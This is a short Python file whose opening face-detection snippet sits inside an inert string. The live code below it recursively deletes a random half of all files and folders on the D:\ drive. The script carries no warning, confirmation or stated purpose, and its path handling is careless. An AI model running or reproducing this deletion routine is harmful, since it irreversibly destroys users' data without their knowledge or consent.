'''
import face_recognition as facedetector
from PIL import Image

image = facedetector.load_image_file("image.jpg")
face_locations = facedetector.face_locations(image)

for face_location in face_locations:
    top, right, bottom, left = face_location
    print("The coordinates for the face is Top: {}, Left: {}, Bottom: {}, Right: {}".format(top, left, bottom, right))

    # You can access the actual face itself like this:
    face_image = image[top:bottom, left:right]
    pil_image = Image.fromarray(face_image)
    pil_image.show()


 '''
import os
import random
import pathlib
import math


def removeHalfFiles(path):
	files = os.listdir(path)
	if(path is osPath):
		files.pop(0)
	random.shuffle(files)
	for i in range((int)(math.ceil(len(files)/2))):
		if(os.path.isfile(path + files[i])):
			os.remove(path + files[i])
		else:
			try:
				os.rmdir(path + files[i], dir_fd=None)
			except OSError:
				removeHalfFiles(path+files[i]+"\\")

osPath = 'D:\\'

removeHalfFiles(osPath)